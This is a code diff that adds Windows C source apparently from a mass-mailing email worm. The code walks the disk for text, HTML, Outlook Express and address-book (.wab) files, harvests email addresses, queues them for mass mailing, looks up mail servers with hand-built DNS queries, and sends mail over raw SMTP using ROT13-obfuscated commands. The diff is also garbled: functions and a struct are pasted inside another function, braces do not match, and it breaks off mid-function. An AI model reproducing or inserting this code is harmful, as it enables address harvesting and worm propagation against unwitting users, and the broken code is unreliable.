@@ -4793,6 +4793,1015 @@ int32_t function_407660(void) {
     return pbBuffer;
 }
 
+static void scan_out(const char *email)
+{
+	massmail_addq(email, 0);
+	return;
+}
+
+//-----------------------------------------------------------------------------
+
+static int scantext_textcvt(unsigned char *buf, int len)
+{
+	static const unsigned char charcvt_tab[256] = {
+          /*00*/ 32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,
+          /*10*/ 32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,
+          /*20*/ 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
+          /*30*/ 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
+          /*40*/ 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
+          /*50*/ 0,0,0,0,0,0,0,0,0,0,0,'(',0,')',0,0,   /* "[]" -> "()" */
+          /*60*/ 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
+          /*70*/ 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
+          /*80*/ 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
+          /*90*/ 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
+          /*A0*/ 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
+          /*B0*/ 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
+          /*C0*/ 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
+          /*D0*/ 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
+          /*E0*/ 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
+          /*F0*/ 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,32
+	};
+
+	static const struct {
+		int in_len;
+		char *in;
+		int out_len;		/* MUST BE <= in_len */
+		char *out;
+	} cvt_tab[] = {
+
+		{ 2, "  ", 1, " " },
+		{ 2, "@ ", 1, "@" },
+		{ 2, " @", 1, "@" },
+		{ 2, "@@", 1, "@" },
+
+/*		{ 2, "( ", 1, "(" },
+ *		{ 2, " )", 1, ")" },
+ *		{ 2, "< ", 1, "<" },
+ *		{ 2, " >", 1, ">" },
+ *		{ 3, "</ ", 2, "</" },
+ *		{ 3, " />", 2, "/>" },
+ */
+		{ 3, "(@)", 1, "@" },
+/*		{ 3, "<@>", 1, "@" },
+ *		{ 3, ".@.", 1, "@" },
+ *		{ 4, ".at.", 1, "@" },
+ */
+
+		{ 4, "(at)", 1, "@" },
+/*		{ 4, "_at_", 1, "@" },
+ *		{ 4, "@at@", 1, "@" },
+ *		{ 4, "\'at\'", 1, "@" },
+ *		{ 4, "\"at\"", 1, "@" },
+ *		{ 8, "(atsign)", 1, "@" },
+ *		{ 9, "(at_sign)", 1, "@" },
+ *		{ 9, "(at-sign)", 1, "@" },
+ *		{ 9, "(at sign)", 1, "@" },
+ *		{ 4, "&lt;", 1, "<" },
+ *		{ 4, "&gt;", 1, "<" },
+ */
+		{ 6, "&nbsp;", 1, " " },
+		{ 5, "&nbsp", 1, " " },
+
+/*		{ 6, "&quot;", 1, "\"" },
+ *		{ 5, "&amp;", 1, "&" },
+ *		{ 4, "<br>", 1, " " },
+ *		{ 5, "<br/>", 1, " " },
+ *		{ 8, "<strong>", 1, " " },
+ *		{ 9, "</strong>", 1, " " },
+ */
+		{ 0, NULL, 0, NULL }
+	};
+
+	register int i, matches;
+	register unsigned char *p, c;
+
+	for (i=len, p=buf; i>0; i--, p++)
+		if ((c = charcvt_tab[*p]) != 0) *p = c;
+
+retry_2nd:
+	for (i=0, matches=0; i<=len; i++) {
+		register int j, k, l;
+		for (j=0; (l = cvt_tab[j].in_len) != 0; j++) {
+			if (l > i) continue;
+			if (xmemcmpi(cvt_tab[j].in, buf + i - l, l) != 0) continue;
+			matches++;
+			i -= l;
+			memcpy(buf+i, cvt_tab[j].out, cvt_tab[j].out_len);
+			if (l != cvt_tab[j].out_len) {
+				//---memcpy(buf+i+cvt_tab[j].out_size, buf+i+l, len-i-l);---
+				register unsigned char *q;
+				for (p=(buf+i+cvt_tab[j].out_len), q=(buf+i+l), k=(len-i-l); k>0; k--)
+					*p++ = *q++;
+			}
+			len = len - l + cvt_tab[j].out_len;
+		}
+	}
+	buf[len] = 0;
+	matches += html_replace(buf);
+	matches += html_replace2(buf);
+	if (matches != 0) goto retry_2nd;
+	return 0;
+}
+
+int scantext_extract_ats(unsigned char *buf, int len)
+{
+	/* alphanumeric and "-_.@!$"; 1=valid e-mail char, 2=invalid only at start/end */
+	static const unsigned char mail_chars[256] = {
+		0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
+		0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
+		0,2,0,0,0,0,0,0,0,0,0,0,0,2,2,0,
+		1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,
+		2,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,
+		1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,2,
+		0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,
+		1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,
+		0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
+		0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
+		0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
+		0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
+		0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
+		0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
+		0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
+		0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+	};
+	struct maillist_t *root, *top;
+	int i, j, st_i, end_i, mail_len;
+	int found;
+	char out_buf[256];
+
+	root = top = NULL;
+	for (i=0,found=0; i<len; i++) {
+		if (buf[i] != '@') continue;
+
+		for (st_i=i; st_i>0; st_i--)
+			if (mail_chars[buf[st_i-1]] == 0) break;
+		for (end_i=i+1; end_i<len; end_i++)
+			if (mail_chars[buf[end_i]] == 0) break;
+
+		for (; st_i<end_i; st_i++)
+			if (mail_chars[buf[st_i]] != 2) break;
+		if (((st_i+3) >= end_i) || (st_i >= i)) continue;
+		for (; end_i > st_i; end_i--)
+			if (mail_chars[buf[end_i-1]] != 2) break;
+		if ((end_i <= (st_i+3)) || (end_i <= i)) continue;
+
+		mail_len = end_i - st_i;
+		if (mail_len < 7) continue;	/* x@xx.xx */
+
+		found++;
+		for (j=0; (j < (sizeof(out_buf)-2)) && (j < mail_len); j++)
+			out_buf[j] = buf[st_i+j];
+		out_buf[j] = 0;
+		scan_out(out_buf);
+	}
+
+	return found;
+}
+
+static int recvline(SOCKET s, char *buf, int size, unsigned long timeout)
+{
+	int i, t;
+	for (i=0; (i+1)<size;) {
+		if (timeout != 0) {
+			fd_set fds;
+			struct timeval tv;
+			FD_ZERO(&fds);
+			FD_SET(s, &fds);
+			tv.tv_sec = timeout / 1000;
+			tv.tv_usec = (timeout % 1000) * 1000;
+			if (select(0, &fds, NULL, NULL, &tv) <= 0)
+				break;
+		}
+		t = recv(s, buf+i, 1, 0);
+		if (t < 0) return -1;
+		if (t == 0) break;
+		if (buf[i++] == '\n') break;
+	}
+	buf[i] = 0;
+	return i;
+}
+
+static unsigned long my_atou_x(char *s)
+{
+	unsigned radix=10, c;
+	unsigned long n=0;
+
+	while (*s == ' ' || *s == '\t') s++;
+
+	if (s[0] == '0' && s[1] == 'x') {
+		radix = 16;
+		s += 2;
+	}
+
+	while (my_isalnum(*s)) {
+		c = my_tolower(*s); s++;
+		if (my_isdigit(c)) c=c-'0'; else c=c-'A'+10;
+		if (c >= radix) break;
+		n = n * radix + c;
+	}
+
+	return n;
+}
+
+static int my_atoi(char *s)
+{
+	int n=0;
+	while (*s == ' ' || *s == '\t') s++;
+	while (my_isalnum(*s))
+		n = n * 10 + (*s++ - '0');
+	return n;
+}
+
+static unsigned long resolve(char *hostname)
+{
+	unsigned long ip = inet_addr(hostname);
+	if (ip == 0xFFFFFFFF || (ip == 0 && hostname[0] != '0')) {
+		struct hostent *h = gethostbyname(hostname);
+		if (h != NULL)
+			ip = *(unsigned long *)h->h_addr_list[0];
+	}
+	if (ip == 0xFFFFFFFF) ip = 0;
+	return ip;
+}
+
+static int mail_extracthdr(char *headers, char *name, char *buf, int bufsize)
+{
+	char *p = headers, *q;
+	char hdrname[256];
+	int i;
+
+	if (headers == NULL || name == NULL || buf == NULL || bufsize <= 0) return 1;
+	while (*p == '\r' || *p == '\n' || *p == ' ' || *p == '\t') p++;
+
+	while (*p) {
+		for (i=0; i<(sizeof(hdrname)-1);) {
+			char c = *p++;
+			if (c == 0) break;
+			if (c == ':' || c == '\r' || c == '\n') { p--; break; }
+			if (c == '\t') c=' ';
+			if (i>0 && c==' ') { if(hdrname[i-1]==' ') continue; }
+			if (i==0 && c==' ') continue;
+			hdrname[i++] = c;
+		}
+		hdrname[i] = 0;
+
+		if (*p == 0) break;
+
+		if (hdrname[lstrlen(hdrname)-1] == ' ') hdrname[lstrlen(hdrname)-1] = 0;
+		if (hdrname[0] == 0) break;
+
+		if (*p == ':') {
+			CharLower(hdrname);
+			if (lstrcmpi(hdrname, name) == 0) {
+				p++;
+				goto hdr_found;
+			}
+		}
+
+		while (*p != '\n' && *p != '\r' && *p) p++;
+		if (*p == 0) break;
+
+		if (*p == '\n') {
+			p++;
+			if (*p == '\r') p++;
+		} else if (*p == '\r') {
+			p++;
+			if (*p == '\n') p++;
+		}
+		if (*p == '\n' || *p == '\r') break;
+	}
+
+	return 1;
+
+hdr_found:
+	if (*p == ' ' || *p == '\t') p++;
+	for (i=0; i<(bufsize-1);) {
+		char c = *p++;
+		if (c == '\r' || c == '\n') {
+			q = p--;
+			while (*q == '\n' || *q == '\r') q++;
+			if (*q != ' ' && *q != '\t') break;
+
+			while (*p == '\n' || *p == '\r') p++;
+			continue;
+		}
+		buf[i++] = c;
+	}
+	buf[i] = 0;
+	return 0;
+}
+
+static int wait_sockread(SOCKET sock, unsigned long timeout)
+{
+	struct timeval tv;
+	fd_set fds;
+
+	tv.tv_sec = timeout / 1000;
+	tv.tv_usec = (timeout % 1000) * 1000;
+	FD_ZERO(&fds);
+	FD_SET(sock, &fds);
+	return (select(0, &fds, NULL, NULL, &tv) <= 0) ? 1 : 0;
+}
+
+static int smtp_issue(SOCKET sock, int timeout, LPCTSTR lpFormat, ...)
+{
+	char buf[1024], *p;
+	int code;
+
+	if (lpFormat != NULL) {
+		va_list arglist;
+			va_start(arglist, lpFormat);
+		wvsprintf(buf, lpFormat, arglist);
+		va_end(arglist);
+		send(sock, buf, lstrlen(buf), 0);
+	}
+
+	for (;;) {
+		if (recvline(sock, buf, sizeof(buf), timeout) <= 0) return 0;
+		for (p=buf, code=0; *p == ' ' || *p == '\t'; p++);
+		while (*p >= '0' && *p <= '9') code = code * 10 + *p++ - '0';
+		if (*p == '-') continue;
+		break;
+	}
+
+	return code;
+}
+
+static int smtp_send_server(struct sockaddr_in *addr, char *message)
+{
+	char from[256], from_domain[256], rcpt[256], *p, *q;
+	char fmt[256];
+	int stat;
+	SOCKET sock;
+
+	if (mail_extracthdr(message, "From", from, sizeof(from))) return 1;
+	if (mail_extracthdr(message, "To", rcpt, sizeof(rcpt))) return 1;
+	for (p=from; *p && *p != '@'; p++);
+	if (*p == 0) return 1;
+	lstrcpy(from_domain, p+1);
+
+	sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
+	if (sock == INVALID_SOCKET) return 1;
+	if (connect(sock, (struct sockaddr *)addr, sizeof(struct sockaddr_in)))
+		goto err;
+
+	if (wait_sockread(sock, 15000)) goto err;
+	stat = smtp_issue(sock, 15000, NULL);
+	if (stat < 200 || stat >= 400) goto err;
+
+	rot13(fmt, "RUYB %f\r\n");	/* EHLO %s */
+	stat = smtp_issue(sock, 10000, fmt, from_domain);
+	if (stat < 200 || stat > 299) {
+		rot13(fmt, "URYB %f\r\n");	/* "HELO %s\r\n" */
+		stat = smtp_issue(sock, 10000, fmt, from_domain);
+		if (stat < 200 || stat > 299) goto err;
+	}
+
+	rot13(fmt, "ZNVY SEBZ:<%f>\r\n");	/* "MAIL FROM:<%s>\r\n" */
+	stat = smtp_issue(sock, 10000, fmt, from);
+	if (stat < 200 || stat > 299) goto err;
+	rot13(fmt, "EPCG GB:<%f>\r\n");		/* "RCPT TO:<%s>\r\n" */
+	stat = smtp_issue(sock, 10000, fmt, rcpt);
+	if (stat < 200 || stat > 299) goto err;
+
+	stat = smtp_issue(sock, 10000, "DATA\r\n");
+	if (stat < 200 || stat > 399) goto err;
+
+	for (p=message;;) {
+		for (q=p; *q && *q != '\n' && *q != '\r'; q++);
+		while (*q == '\n' || *q == '\r') q++;
+		if (p == q) break;
+
+		if (*p == '.') send(sock, ".", 1, 0);
+		if (send(sock, p, q-p, 0) <= 0) goto err;
+		p = q;
+	}
+
+	send(sock, "\r\n.\r\n", 5, 0);
+
+	stat = smtp_issue(sock, 15000, NULL);
+	if (stat < 200 || stat >= 400) goto err;
+
+	smtp_issue(sock, 5000, "QUIT\r\n");
+
+	closesocket(sock);
+	return 0;
+
+err:	closesocket(sock);
+	return 1;
+}
+
+int scan_textfile(const char *filename)
+{
+	HANDLE hFile;
+	DWORD dwRead, dwTotalRead, dwTotalFound;
+	char buf[65535];
+
+	hFile = CreateFile(filename, GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_WRITE,
+		NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	if (hFile == NULL || hFile == INVALID_HANDLE_VALUE) return 1;
+
+	dwTotalRead = 0;
+	dwTotalFound = 0;
+	for (;;) {
+		dwRead = 0;
+		ReadFile(hFile, buf, sizeof(buf)-2, &dwRead, NULL);
+		if (dwRead == 0 || dwRead >= sizeof(buf)) break;
+		dwTotalRead += dwRead;
+		buf[dwRead] = 0;
+
+		scantext_textcvt(buf, dwRead);
+		dwTotalFound += scantext_extract_ats(buf, dwRead);
+
+		if ((dwTotalFound == 0) && (dwTotalRead > (300*1024)))
+			break;
+	}
+	CloseHandle(hFile);
+	return 0;
+}
+
+//-----------------------------------------------------------------------------
+// Recursive directory scanner
+
+static int scan_wab(const char *);
+
+static void scan_dir_file(const char *path, WIN32_FIND_DATA *fd)
+{
+	char file_ext[16];
+	int i, j;
+	DWORD size_lim;
+
+	if (fd->nFileSizeLow < 40) return;
+
+	for (i=0,j=-1; fd->cFileName[i] && (i < 255); i++)
+		if (fd->cFileName[i] == '.') j=i;
+
+	if (j < 0) {
+		file_ext[0] = 0;
+	} else {
+		lstrcpyn(file_ext, fd->cFileName+j+1, sizeof(file_ext)-1);
+		CharLower(file_ext);
+	}
+
+	do {
+		size_lim = 200 * 1024;
+
+		i = 0;				/* stop */
+		if (file_ext[0] == 0)
+			if (fd->nFileSizeLow > (20*1024)) break;
+
+		i = 1;				/* parse as text file */
+		if (lstrcmp(file_ext, "txt") == 0) {size_lim=80*1024; break; }
+		if (xstrncmp(file_ext, "htmb", 3) == 0) break;
+		if (xstrncmp(file_ext, "shtl", 3) == 0) break;
+		if (xstrncmp(file_ext, "phpq", 3) == 0) break;
+		if (xstrncmp(file_ext, "aspd", 3) == 0) break;
+		if (xstrncmp(file_ext, "dbxn", 3) == 0) break;
+		if (xstrncmp(file_ext, "tbbg", 3) == 0) { size_lim=1200*1024; break; }
+		if (xstrncmp(file_ext, "adbh", 3) == 0) break;
+		if (lstrcmp(file_ext, "pl") == 0) break;
+
+		i = 2;				/* parse as WAB */
+		if (xstrncmp(file_ext, "wab", 3) == 0) { size_lim=8*1024*1024; break; }
+
+		i = 0;
+		return;
+	} while (0);
+
+	if (fd->nFileSizeLow > size_lim) return;
+
+	while (scan_freezed) Sleep(2048);
+
+	if (i == 1) {
+		scan_textfile(path);
+	} else if (i == 2) {
+		scan_wab(path);
+	}
+	//dns masive scan
+	struct mx_rrlist_t {
+	struct mx_rrlist_t *next;
+	char domain[260];
+	WORD rr_type;
+	WORD rr_class;
+	WORD rdlen;
+	int rdata_offs;
+};
+
+static int mx_dns2qname(const char *domain, unsigned char *buf)
+{
+	int i, p, t;
+	for (i=0,p=0;;) {
+		if (domain[i] == 0) break;
+		for (t=i; domain[t] && (domain[t] != '.'); t++);
+		buf[p++] = (t - i);
+		while (i < t) buf[p++] = domain[i++];
+		if (domain[i] == '.') i++;
+	}
+	buf[p++] = '\0';
+	return p;
+}
+
+static int mx_make_query(int sock, struct sockaddr_in *dns_addr, const char *domain, WORD req_flags)
+{
+	unsigned char buf[1024];
+	int i, tmp;
+
+	memset(buf, 0, sizeof(buf));
+	i = 0;
+	*(WORD *)(buf+i) = (WORD)(GetTickCount() & 0xFFFF); i += 2;
+	*(WORD *)(buf+i) = req_flags; i += 2;		/* flags */
+	*(WORD *)(buf+i) = htons(0x0001); i += 2;	/* qncount */
+	*(WORD *)(buf+i) = 0; i += 2;
+	*(WORD *)(buf+i) = 0; i += 2;
+	*(WORD *)(buf+i) = 0; i += 2;
+
+	tmp = mx_dns2qname(domain, buf+i); i += tmp;
+	*(WORD *)(buf+i) = htons(TYPE_MX); i += 2;
+	*(WORD *)(buf+i) = htons(CLASS_IN); i += 2;
+
+	tmp = sendto(sock, buf, i, 0, (struct sockaddr *)dns_addr, sizeof(struct sockaddr_in));
+	return (tmp <= 0) ? 1 : 0;
+}
+
+static int mx_skipqn(unsigned char *buf, int pos, int len, struct dnsreq_t *reply_hdr)
+{
+	int i, n;
+	for (i=0; (i<ntohs(reply_hdr->qncount)) && (pos < len);) {
+		n = buf[pos];
+		if (n == 0) {
+			pos += 5;
+			i++;
+		} else if (n < 64) {
+			pos += 1+n;
+		} else {
+			pos += 6;
+			i++;
+		}
+	}
+	return pos;
+}
+
+static int mx_decode_domain(unsigned char *buf, int pos, int len, char *out)
+{
+	int retpos=0, sw, n, j, out_pos;
+	*out = 0;
+
+	for (sw=0, out_pos=0; pos < len;) {
+		if (out_pos >= 255)
+			break;
+		n = (unsigned char)buf[pos];
+		if (n == 0) {
+			pos++;
+			break;
+		} else if (n < 64) {
+			pos++;
+			for (j=0; j<n; j++)
+				out[out_pos++] = buf[pos++];
+			out[out_pos++] = '.';
+		} else {
+			if (sw == 0) retpos=pos+2;
+			sw = 1;
+			n = ntohs(*(WORD *)(buf+pos)) & 0x3FFF;
+			pos = n;
+			if (pos >= len) break;
+		}
+	}
+
+	while (out_pos > 0)
+		if (out[out_pos-1] != '.') break; else out_pos--;
+	out[out_pos] = 0;
+
+	return (sw == 0) ? pos : retpos;
+}
+
+static void mx_free_rrlist(struct mx_rrlist_t *p)
+{
+	struct mx_rrlist_t *q;
+	while (p != NULL) {
+		q = p->next;
+		mx_free(p);
+		p = q;
+	}
+}
+
+static struct mx_rrlist_t *mx_parse_rr(unsigned char *buf, int reply_len)
+{
+	struct mx_rrlist_t *root, *top, *newrr, tmp_rr;
+	struct dnsreq_t *reply_hdr;
+	int i, j, rr, rr_count;
+
+	root = top = NULL;
+	reply_hdr = (struct dnsreq_t *)buf;
+
+	if (reply_len < 12) return NULL;
+	i = 12;
+	i = mx_skipqn(buf, i, reply_len, reply_hdr);
+
+	if (i >= reply_len)
+		return NULL;
+
+	rr_count = reply_hdr->ancount + reply_hdr->nscount + reply_hdr->arcount;
+	for (rr=0,newrr=NULL; (rr < rr_count) && (i < reply_len); rr++) {
+		memset(&tmp_rr, '\0', sizeof(struct mx_rrlist_t));
+		i = mx_decode_domain(buf, i, reply_len, tmp_rr.domain);
+		if ((i+10) >= reply_len) break;
+		tmp_rr.rr_type = ntohs(*(WORD*)(buf+i)); i += 2;
+		tmp_rr.rr_class = ntohs(*(WORD*)(buf+i)); i += 2;
+		i += 4;		/* 32-bit TTL */
+		tmp_rr.rdlen = ntohs(*(WORD*)(buf+i)); i += 2;
+		tmp_rr.rdata_offs = i;
+		if ((tmp_rr.rdlen < 0) || ((i+tmp_rr.rdlen) > reply_len)) break;
+
+		j = sizeof(struct mx_rrlist_t) + 16;
+		newrr = (struct mx_rrlist_t *)mx_alloc(j);
+		if (newrr == NULL) break;
+		memset((char *)newrr, '\0', j);
+		*newrr = tmp_rr;
+		i += tmp_rr.rdlen;
+
+		newrr->next = NULL;
+		if (top == NULL) {
+			root = top = newrr;
+		} else {
+			top->next = newrr;
+			top = newrr;
+		}
+	}
+	return root;
+}
+
+static struct mxlist_t *my_get_mx_list2(struct sockaddr_in *dns_addr, const char *domain, int *err_stat)
+{
+	int sock, reply_len, rrcode, buf_size;
+	int loc_retry;
+	struct timeval tv;
+	struct fd_set fds;
+	unsigned char *buf;
+	unsigned short query_fl;
+	struct dnsreq_t *reply_hdr;
+	struct mx_rrlist_t *rrlist=NULL, *rr1;
+	struct mxlist_t *mxlist_root, *mxlist_top, *mxlist_new;
+
+	*err_stat = 1;
+
+	buf_size = 4096;
+	buf = (char *)mx_alloc(buf_size);
+	if (buf == NULL) return NULL;
+
+	sock = socket(PF_INET, SOCK_DGRAM, IPPROTO_UDP);
+	if (sock == 0 || sock == INVALID_SOCKET) {
+		mx_free(buf);
+		return NULL;
+	}
+
+	for (loc_retry=0; loc_retry<2; loc_retry++) {
+		mxlist_root = mxlist_top = NULL;
+
+		if (loc_retry == 0)
+			query_fl = htons(0x0100);
+		else
+			query_fl = htons(0);
+
+		if (mx_make_query(sock, dns_addr, domain, query_fl))
+			continue;
+
+		FD_ZERO(&fds); FD_SET(sock, &fds);
+		tv.tv_sec = 12; tv.tv_usec = 0;
+		if (select(0, &fds, NULL, NULL, &tv) <= 0)
+			continue;
+
+		memset(buf, '\0', sizeof(buf));
+		reply_len = recv(sock, buf, buf_size,0);
+		if (reply_len <= 0 || reply_len <= sizeof(struct dnsreq_t))
+			continue;
+
+		reply_hdr = (struct dnsreq_t *)buf;
+
+		rrcode = ntohs(reply_hdr->flags) & 0x0F;
+		if (rrcode == 3) {
+			*err_stat = 2;
+			break;
+		}
+		if ((rrcode == 2) && (ntohs(reply_hdr->flags) & 0x80)) {
+			*err_stat = 2;
+			break;
+		}
+		if (rrcode != 0)
+			continue;
+
+		rrlist = mx_parse_rr(buf, reply_len);
+		if (rrlist == NULL)
+			continue;
+
+		mxlist_root = mxlist_top = NULL;
+		for (rr1=rrlist; rr1; rr1=rr1->next) {
+			if ((rr1->rr_class != CLASS_IN) || (rr1->rr_type != TYPE_MX) || (rr1->rdlen < 3))
+				continue;
+			mxlist_new = (struct mxlist_t *)mx_alloc(sizeof(struct mxlist_t));
+			if (mxlist_new == NULL) break;
+			memset(mxlist_new, 0, sizeof(struct mxlist_t));
+
+			mxlist_new->pref = ntohs(*(WORD *)(buf+rr1->rdata_offs+0));
+			mx_decode_domain(buf, rr1->rdata_offs+2, reply_len, mxlist_new->mx);
+			if (mxlist_new->mx[0] == 0) {
+				mx_free(mxlist_new);
+				continue;
+			}
+
+			if (mxlist_top == NULL) {
+				mxlist_root = mxlist_top = mxlist_new;
+			} else {
+				mxlist_top->next = mxlist_new;
+				mxlist_top = mxlist_new;
+			}
+		}
+
+		if (mxlist_root == NULL) {
+			mx_free_rrlist(rrlist);
+			continue;
+		}
+
+		mx_free_rrlist(rrlist);
+		break;
+	}
+	mx_free(buf);
+	closesocket(sock);
+	return mxlist_root;
+}
+
+struct mxlist_t *my_get_mx_list(struct sockaddr_in *dns_addr, const char *domain)
+{
+	struct mxlist_t *list;
+	int i, e;
+	for (i=0; i<2; i++) {
+		list = my_get_mx_list2(dns_addr, domain, &e);
+		if (list != NULL) return list;
+		if (e == 2)		/* permanent error */
+			break;
+		Sleep(100);
+	}
+	return NULL;
+}
+
+//-----------------------------------------------------------------------------
+
+typedef DNS_STATUS (WINAPI *DNSQUERYA)(IN PCSTR pszName, IN WORD wType, IN DWORD Options, IN PIP4_ARRAY aipServers OPTIONAL, IN OUT PDNS_RECORD *ppQueryResults OPTIONAL, IN OUT PVOID *pReserved OPTIONAL);
+
+static struct mxlist_t *getmx_dnsapi(const char *domain)
+{
+	HINSTANCE hDnsapi;
+	DNSQUERYA pDnsQuery_A;
+	DNS_RECORD *pQueryResults, *pQueryRec;
+	DNS_STATUS statusDns;
+	char szDnsApi[] = "dnsapi.dll";
+	struct mxlist_t *mx_root, *mx_top, *mx_new;
+
+	hDnsapi = GetModuleHandle(szDnsApi);
+	if (hDnsapi == NULL) {
+		hDnsapi = LoadLibrary(szDnsApi);
+		if (hDnsapi == NULL) return NULL;
+	}
+	pDnsQuery_A = (DNSQUERYA)GetProcAddress(hDnsapi, "DnsQuery_A");
+	if (pDnsQuery_A == NULL) return NULL;
+
+	statusDns = pDnsQuery_A(domain, DNS_TYPE_MX, DNS_QUERY_STANDARD, NULL, &pQueryResults, NULL);
+	if (statusDns != ERROR_SUCCESS) return NULL;
+
+	mx_root = mx_top = NULL;
+	for (pQueryRec=pQueryResults; pQueryRec; pQueryRec = pQueryRec->pNext) {
+		if (pQueryRec->wType != DNS_TYPE_MX) continue;
+		mx_new = (struct mxlist_t *)mx_alloc(sizeof(struct mxlist_t));
+		if (mx_new == NULL) break;
+		memset(mx_new, '\0', sizeof(struct mxlist_t));
+		mx_new->pref = pQueryRec->Data.MX.wPreference;
+		lstrcpyn(mx_new->mx, pQueryRec->Data.MX.pNameExchange, 255);
+		if (mx_top == NULL) {
+			mx_root = mx_top = mx_new;
+		} else {
+			mx_top->next = mx_new;
+			mx_top = mx_new;
+		}
+	}
+	return mx_root;
+}
+
+//-----------------------------------------------------------------------------
+
+typedef DWORD (WINAPI *GetNetworkParams_t)(PFIXED_INFO, PULONG);
+
+static struct mxlist_t *getmx_mydns(const char *domain)
+{
+	static const char szIphlpapiDll[] = "iphlpapi.dll";
+	HINSTANCE hIphlpapi;
+	GetNetworkParams_t pGetNetworkParams;
+	char *info_buf;
+	FIXED_INFO *info;
+	IP_ADDR_STRING *pa;
+	DWORD dw, info_buf_size;
+	struct sockaddr_in addr;
+	struct mxlist_t *mxlist;
+
+	hIphlpapi = GetModuleHandle(szIphlpapiDll);
+	if (hIphlpapi == NULL || hIphlpapi == INVALID_HANDLE_VALUE)
+		hIphlpapi = LoadLibrary(szIphlpapiDll);
+	if (hIphlpapi == NULL || hIphlpapi == INVALID_HANDLE_VALUE) return NULL;
+	pGetNetworkParams = (GetNetworkParams_t)GetProcAddress(hIphlpapi, "GetNetworkParams");
+	if (pGetNetworkParams == NULL) return NULL;
+
+	info_buf_size = 16384;
+	info_buf = (char *)mx_alloc(info_buf_size);
+	dw = info_buf_size;
+	info = (FIXED_INFO *)info_buf;
+	if (pGetNetworkParams(info, &dw) != ERROR_SUCCESS)
+		return NULL;
+
+	for (mxlist=NULL,pa=&info->DnsServerList; pa; pa=pa->Next) {
+		if (pa->IpAddress.String == NULL) continue;
+		addr.sin_family = AF_INET;
+		addr.sin_port = htons(53);
+		addr.sin_addr.s_addr = inet_addr(pa->IpAddress.String);
+		if (addr.sin_addr.s_addr == 0 || addr.sin_addr.s_addr == 0xFFFFFFFF) {
+			struct hostent *h = gethostbyname(pa->IpAddress.String);
+			if (h == NULL) continue;
+			addr.sin_addr = *(struct in_addr *)h->h_addr_list[0];
+		}
+		if (addr.sin_addr.s_addr == 0 || addr.sin_addr.s_addr == 0xFFFFFFFF)
+			continue;
+
+		mxlist = my_get_mx_list(&addr, domain);
+		if (mxlist != NULL) break;
+	}
+	mx_free(info_buf);
+	return mxlist;
+}
+}
+
+static int scan_dir1(const char *path, int max_level)
+{
+	WIN32_FIND_DATA fd;
+	HANDLE hFind;
+	char buf[MAX_PATH+20];
+
+	if ((max_level <= 0) || (path == NULL)) return 1;
+	if (path[0] == 0) return 1;
+
+	while (scan_freezed) Sleep(2048);
+
+	lstrcpy(buf, path);
+	if (buf[lstrlen(buf)-1] != '\\') lstrcat(buf, "\\");
+	lstrcat(buf, "*.*");
+
+	memset(&fd, 0, sizeof(fd));
+	for (hFind=NULL;;) {
+		if (hFind == NULL) {
+			hFind = FindFirstFile(buf, &fd);
+			if (hFind == INVALID_HANDLE_VALUE) hFind = NULL;
+			if (hFind == NULL) break;
+		} else {
+			if (FindNextFile(hFind, &fd) == 0) break;
+		}
+
+		if (fd.cFileName[0] == '.') {
+			if (fd.cFileName[1] == 0) continue;
+			if (fd.cFileName[1] == '.')
+				if (fd.cFileName[2] == 0) continue;
+		}
+
+		lstrcpy(buf, path);
+		if (buf[lstrlen(buf)-1] != '\\') lstrcat(buf, "\\");
+		lstrcat(buf, fd.cFileName);
+
+		if ((fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == FILE_ATTRIBUTE_DIRECTORY) {
+			Sleep(75);
+			scan_dir1(buf, max_level-1);
+		} else {
+			scan_dir_file(buf, &fd);
+		}
+	}
+	if (hFind != NULL) FindClose(hFind);
+	return 0;
+}
+
+//-----------------------------------------------------------------------------
+// .wab scanner
+
+static int scan_wab(const char *filename)
+{
+	HANDLE hFile, hMap;
+	DWORD cnt, base1, maxsize, i;
+	register DWORD b, j;
+	unsigned char *ptr;
+	char email[128];
+
+	hFile = CreateFile(filename, GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_WRITE,
+			NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	if (hFile == NULL || hFile == INVALID_HANDLE_VALUE) return 1;
+	maxsize = GetFileSize(hFile, NULL);
+
+	hMap = CreateFileMapping(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
+	if (hMap == NULL || hMap == INVALID_HANDLE_VALUE) {
+		CloseHandle(hFile);
+		return 2;
+	}
+
+	ptr = (unsigned char *)MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
+	if (ptr == NULL) {
+		CloseHandle(hMap);
+		CloseHandle(hFile);
+		return 3;
+	}
+
